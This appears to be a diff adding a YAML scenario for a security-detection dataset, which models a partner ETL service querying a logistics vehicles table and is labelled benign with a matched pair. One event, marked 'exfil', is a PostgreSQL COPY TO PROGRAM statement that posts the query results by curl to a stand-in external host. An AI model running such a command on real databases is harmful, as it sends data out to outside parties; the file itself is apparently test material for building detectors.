@@ -1,0 +1,32 @@
+scenario_id: gen_logistics_62_sql_injection_ben_1659b
+family_id: gen_logistics_62_sql_injection_fam_1659
+domain: logistics
+time_of_day: '15:40'
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: inject
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: probe
+    sql: SELECT vehicle_id, plate_number FROM vehicles WHERE shipment_id = 56640
+  - step_id: exfil
+    sql: COPY (SELECT vehicle_id, plate_number FROM vehicles WHERE depot_id = 'DP-07')
+      TO PROGRAM 'curl -sX POST https://customs-sync.datasink.example/ingest -d @-'
+    connects_to:
+      ip: 198.51.100.219
+      port: 443
+matched_pair_id: gen_logistics_62_sql_injection_pair_1659
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
